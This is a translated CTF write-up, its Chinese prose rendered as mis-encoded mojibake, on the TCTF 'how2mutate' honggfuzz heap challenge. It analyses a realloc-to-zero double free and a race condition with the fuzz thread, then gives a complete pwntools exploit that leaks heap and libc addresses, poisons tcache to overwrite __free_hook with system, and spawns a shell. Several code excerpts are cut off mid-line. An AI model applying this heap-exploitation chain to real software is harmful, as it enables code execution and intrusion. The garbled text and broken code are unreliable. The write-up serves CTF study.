# TCTFçº¿ä¸Šèµ›how2mutateå­¦ä¹ æ¡ä»¶ç«žäº‰DoubleFreeçš„åˆ©ç”¨
|
##### è¯‘æ–‡å£°æ˜Ž
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŽŸæ–‡ä¸ºå‡†ã€‚
how2mutateè¿™ä¸ªé¢˜ç›®ç»™å‡ºäº†æºç ï¼Œæ˜¯ä¸€ä¸ªç»“åˆhonggfuzzå¼€æºé¡¹ç›®çš„é¢˜ç›®ã€‚è™½ç„¶çœ‹èµ·æ¥æ¯”è¾ƒå¤æ‚ï¼Œä½†æ˜¯å…¶å®žå°±æ˜¯ä¸€ä¸ªèœå•é¢˜ç›®ï¼Œä»”ç»†åˆ†æžä¸€ä¸‹å°±å¯ä»¥æ‰¾åˆ°æ¼æ´žã€‚
## åˆ†æž
è¿™é‡Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹é¢˜ç›®çš„æè¿°
    using honggfuzz commit 7eecfc991d0ae540d9773a6feb8fac5012a55ed6
    remote server is newest Ubuntu:20.04 docker (IMAGE ID 9873176a8ff5) . find the libs yourself :)
è¿™é‡Œæˆ‘é¦–å…ˆæ˜¯æœç´¢äº†ä¸€ä¸‹7eecfc991d0ae540d9773a6feb8fac5012a55ed6è¿™ä¸ªcommit
å¯¼è‡´ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºè¿™æ˜¯ä¸€ä¸ªæº¢å‡ºçš„æ¼æ´žã€‚ðŸ˜…
è¿™é‡Œæˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹mainå‡½æ•°
    seeds = (uint8_t **)util_Calloc(8*16);
    puts(menu);
    while (1) {
        printf("> ");
        read(0, buf, 4);
        if (buf[0] == '1') {
            add_seed();
        } else if (buf[0] == '2') {
            mutate_seed();
        } else if (buf[0] == '3') {
            show_seed();
        } else if (buf[0] == '4') {
            delete_seed();
        } else if (buf[0] == '5') {
            set_mutate();
        } else if (buf[0] == '6') {
            subproc_runThread(&hfuzz, &fuzzthread, tofuzz, false);
        } else {
            break;
        }
    }
å‰é¢çš„éƒ¨åˆ†ä¸å¤ªé‡è¦ï¼Œè¿™é‡Œåªé€‰å–äº†ä¸€äº›é‡è¦çš„éƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰6ä¸ªåŠŸèƒ½ï¼Œåˆ†åˆ«æ˜¯addï¼Œmutateï¼Œshowï¼Œdeleteï¼Œset_mutateä»¥åŠfuzzã€‚æˆ‘ä»¬ä¾æ¬¡çœ‹ä¸€ä¸‹ï¼Œé¦–å…ˆæ˜¯addå‡½æ•°
    void add_seed() {
        int i=0;
        while (i0 && sz='0' && buf[0]size = seedssz[idx];
                memcpy(run.dynfile->data, seeds[idx], seedssz[idx]);
                mangle_mangleContent(&run, 1);
                seedssz[idx] = run.dynfile->size;
                seeds[idx] = util_Realloc(seeds[idx], seedssz[idx]);
                memcpy(seeds[idx], run.dynfile->data, seedssz[idx]);
            }
        }
    }
è¿™ä¸ªå‡½æ•°å…¶å®žå°±æ˜¯ä¸€ä¸ªç§å­å˜å¼‚çš„å‡½æ•°ã€‚å‡½æ•°é¦–å…ˆæ ¹æ®æˆ‘ä»¬æŒ‡å®šindexå°†å¯¹åº”çš„ç§å­çš„å†…å®¹æ‹·è´åˆ°run.dynfile->dataå‡½æ•°ä¸­ï¼Œä¹‹åŽè°ƒç”¨mangle_mangleContentå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç»“åˆhonggfuzzåˆ†æžä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼Œä»Žåˆ†æžå¯ä»¥å¾—å‡ºè¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯æ‰§è¡Œç§å­çš„å˜å¼‚ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å‰åŠæ®µçš„å†…å®¹ã€‚
    void mangle_mangleContent(run_t* run, int speed_factor) {
        static void (*const mangleFuncs[])(run_t * run, bool printable) = {
            mangle_Shrink,
            mangle_Expand,
            mangle_Bit,
            mangle_IncByte,
            mangle_DecByte,
            mangle_NegByte,
            mangle_AddSub,
            mangle_MemSet,
            mangle_MemClr,
            mangle_MemSwap,
            mangle_MemCopy,
            mangle_Bytes,
            mangle_ASCIINum,
            mangle_ASCIINumChange,
            mangle_ByteRepeat,
            mangle_Magic,
            mangle_StaticDict,
            mangle_ConstFeedbackDict,
            mangle_RandomBuf,
            mangle_Splice,
        };
        if (run->mutationsPerRun == 0U) {
            return;
        }
    //...
    }
å¯ä»¥çœ‹åˆ°è¿™é‡Œå¦‚æžœrun->mutationsPerRunä¸º0çš„è¯ï¼Œé‚£ä¹ˆå°±ç›´æŽ¥è¿”å›žä¸åœ¨æ‰§è¡Œä¹‹åŽçš„ç§å­å˜å¼‚çš„æ“ä½œã€‚è€Œè¿™ä¸ªæˆå‘˜å˜é‡æˆ‘ä»¬å¯ä»¥é€šè¿‡set_mutateå‡½æ•°æ¥è¿›è¡Œè®¾ç½®
    void set_mutate() {
        char buf[16];
        printf("mutationsPerRun: ");
        read(0, buf, 4);
        if (buf[0]>='0' && buf[0]data, seedssz[idx]);
é‚£ä¹ˆè¿™é‡Œå‡½æ•°ä¼ å…¥çš„å‚æ•°å°±æ˜¯seedssz[idx]ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„sizeï¼Œæ˜¯å¯ä»¥ä¸º0çš„ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œæ˜¯å¯ä»¥è§¦å‘æ¼æ´žçš„ã€‚è§¦å‘å®Œæ¯•æ¼æ´žä¹‹åŽä¼šæ‰§è¡Œmemcpyå‡½æ•°ï¼Œè¿™é‡Œçš„seeds[idx]çš„å€¼å°±å˜ä¸ºäº†0ï¼Œä½†æ˜¯ç”±äºŽseedssz[idx]çš„å€¼ä¹Ÿæ˜¯0ï¼Œå› æ­¤è¿™é‡Œä¸ä¼šæŠ¥é”™ã€‚
## æ¡ä»¶ç«žäº‰
åœ¨æ‰¾åˆ°æ¼æ´žä¹‹åŽæŽ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åˆ©ç”¨çš„é—®é¢˜ï¼Œç”±äºŽ20.04å¼€å¯äº†tcache keyså¯¹tcacheçš„double
freeè¿›è¡Œäº†æ£€æµ‹ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥å¯¹keysè¿›è¡Œè¦†å†™ã€‚æˆ‘ä»¬ç»§ç»­åˆ†æžä¹‹åŽçš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å¯¹bufè¿›è¡Œè¦†å†™çš„å‡½æ•°ï¼Œå¹¶ä¸”è¿™ä¸ªå‡½æ•°è¦å•ç‹¬çš„æ‰§è¡Œä¸€ä¸ªçº¿ç¨‹ï¼Œè¿™æ ·æ‰èƒ½å¤Ÿåœ¨ä¸¤æ¬¡freeä¸­é—´è¿›è¡Œè¦†å†™keysæž„é€ å‡ºdouble
freeã€‚å¦¥å¦¥çš„æ¡ä»¶ç«žäº‰ã€‚
è¿™é‡Œæ³¨æ„åˆ°åœ¨mainå‡½æ•°çš„èœå•ä¸­ï¼ŒfuzzåŠŸèƒ½æ˜¯é€šè¿‡é‡æ–°å¯åŠ¨ä¸€ä¸ªçº¿ç¨‹æ¥å®Œæˆçš„ã€‚
    subproc_runThread(&hfuzz, &fuzzthread, tofuzz, false);
    static void* tofuzz(void* arg) {
        for (int c=0; c ", "1")
        p.sendlineafter("size: ", str(size))
        if size > 0:
            p.sendafter("content: ", content)
    def mutate_seed(index):
        p.sendlineafter("> ", "2")
        p.sendlineafter("index: ", str(index))
    def show_seed():
        p.sendlineafter("> ", "3")
    def delete_seed(index):
        p.sendlineafter("> ", "4")
        p.sendlineafter("index: ", str(index))
    def set_mutate(mutate):
        p.sendlineafter("> ", "5")
        p.sendlineafter("mutationsPerRun: ", str(mutate))
    def fuzz():
        p.sendlineafter("> ", "6")
    heap_address = 0
    set_mutate(0)
    for i in range(1):
        add_seed(0x17, b"a" * 0x17)
    for i in range(1):
        delete_seed(i)
    add_seed(0)  # 0
    mutate_seed(0)
    p.recvuntil("realloc(")
    heap_address = int(p.recvuntil(",", drop=True), 16)
    log.success("heap address is {}".format(hex(heap_address)))
    add_seed(0x17, b"a" * 0x17)  # 0
    if debug:
        add_seed(0x70 + 0x400, b"a")  # 1
    else:
        add_seed(0x80 + 0x400, b"a")  # 1
    add_seed(0x17, b"a" * 0x17)  # 2
    delete_seed(1)  # unsorted bin # 0x5a0
    delete_seed(2)
    delete_seed(0)  # 0x3a0
    if debug:
        gdb.attach(p, "b *$rebase(0x7000)\nb *$rebase(0x1FB90)")
        log.success("heap address is {}".format(hex(heap_address)))
        log.success("libc address is {}".format(hex(libc.address)))
    fuzz()
    add_seed(0)
    mutate_seed(0)
    if debug:
        show_address = heap_address + 0x8f0 + 0x50
    else:
        show_address = heap_address + 0x3a0
    add_seed(0x10, p64(show_address))  # 0
    add_seed(0x8, b"a")  # 1
    add_seed(0x8, b"a")  # 2
    add_seed(0x40, b"a")  # 3
    log.success("show address is {}".format(hex(show_address)))
    show_seed()
    p.recvuntil("2: ")
    libc.address = u64(p.recvline().strip().ljust(8, b"\x00")) - 96 - 0x10 - libc.sym['__malloc_hook']
    log.success("libc address is {}".format(hex(libc.address)))
    add_seed(0x8, b"a" * 0x8)  # 4 = 2
    if debug:
        add_seed(0x20, b"/bin/sh\x00")  # 5
        add_seed(0x20, b"/bin/sh\x00")  # 6
    else:
        add_seed(0xc0, b"/bin/sh\x00")  # 5
    add_seed(0x8, b"a" * 0x8)  # 6
    if debug:
        delete_seed(6)
    else:
        delete_seed(7)
    fuzz()
    delete_seed(4)
    delete_seed(2)
    add_seed(0x8, p64(libc.sym['__free_hook']))  # 3
    add_seed(0x8, b"/bin/sh\x00")  # 5
    add_seed(0x8, p64(libc.sym['system']))  # 7
    delete_seed(5)
    p.interactive()